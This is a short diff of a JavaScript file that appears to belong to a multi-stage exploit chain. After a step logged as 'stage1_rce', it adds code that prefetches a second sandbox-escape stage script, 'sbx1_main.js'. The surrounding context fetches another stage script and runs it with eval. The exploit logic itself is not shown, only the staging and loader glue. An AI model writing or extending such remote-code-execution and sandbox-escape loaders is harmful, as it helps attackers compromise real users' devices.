@@ -10203,6 +10203,13 @@ async function main() {
           const rce_end = Date.now();
           log(`-`.repeat(0x28));
           try {
+                const sbx1_prefetch = getJS('sbx1_main.js?' + Date.now());
+                if (sbx1_prefetch && sbx1_prefetch.length > 0) {
+                  p.prefetched_sbx1_script = sbx1_prefetch;
+                  log("[stage1_rce] prefetched sbx1_main.js bytes=" + sbx1_prefetch.length);
+                } else {
+                  log("[stage1_rce] sbx1_main.js prefetch returned empty");
+                }
                 const sbx0_script = getJS('sbx0_main_18.4.js?' + Date.now());
                 log("after get js");
                 eval(sbx0_script);
